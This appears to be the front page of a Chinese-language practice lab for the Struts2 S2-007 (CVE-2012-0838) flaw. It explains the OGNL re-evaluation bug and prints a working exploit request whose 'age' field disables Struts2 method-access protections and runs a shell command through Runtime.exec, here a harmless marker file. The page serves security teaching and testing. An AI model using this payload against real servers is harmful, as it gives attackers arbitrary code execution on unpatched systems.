<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Struts2 S2-007 靶场</title>
    <style>
        body { margin: 0; font-family: "Helvetica Neue", "PingFang SC", sans-serif; background: #f5efe7; color: #1d2a35; }
        .wrap { max-width: 980px; margin: 0 auto; padding: 28px 18px 40px; }
        .card { background: #fffdf8; border: 1px solid #d9ccb9; border-radius: 22px; padding: 24px; box-shadow: 0 16px 44px rgba(76, 51, 33, 0.08); margin-bottom: 18px; }
        a { color: #155b52; }
        code, pre { font-family: Consolas, monospace; }
        pre { background: #15202b; color: #e7eef7; padding: 14px; border-radius: 12px; white-space: pre-wrap; word-break: break-word; }
        p, li { line-height: 1.75; }
    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-007 演示靶场</h1>
        <p>这个模块用来演示 <code>S2-007 / CVE-2012-0838</code>。当 <code>age</code> 字段发生类型转换错误，并且 Action 配置了验证规则时，Struts2 会在错误处理流程里再次解析拼接后的 OGNL 表达式。</p>
    </div>
    <div class="card">
        <h2>推荐入口</h2>
        <p><a href="user.action">打开用户资料页 /user.action</a></p>
        <pre>POST /user.action
name=demo
email=demo@example.com
age=' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false"),#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec('touch /tmp/struts2-s2-007-success')) + '</pre>
        <p>推荐先从页面按钮填充 payload，再触发类型转换错误页。</p>
    </div>
</div>
</body>
</html>
